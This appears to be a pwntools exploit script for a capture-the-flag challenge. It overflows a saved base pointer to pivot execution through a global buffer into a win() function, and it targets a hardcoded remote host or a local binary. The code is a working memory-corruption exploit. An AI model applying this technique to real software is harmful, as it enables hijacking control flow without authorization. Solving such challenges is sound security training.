#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('rbp')

host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11606)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# 0x401162		-	win()

# 0x4000800c68	-	"message"
# 0x4000800c70	-	rbp
# 0x4000800c78	-	ret

# 0x405080		-	buf2

io.recvuntil(b"Let's overflow saved rbp! reading 16 bytes:\n")
pl = 8 * b"a"
pl += p64(0x405080 - 0x8)
io.send(pl)

io.recvuntil(b"Let's prepare some handy buffer! reading 8 bytes:\n")
pl = p64(0x401162)
io.send(pl)

io.interactive()

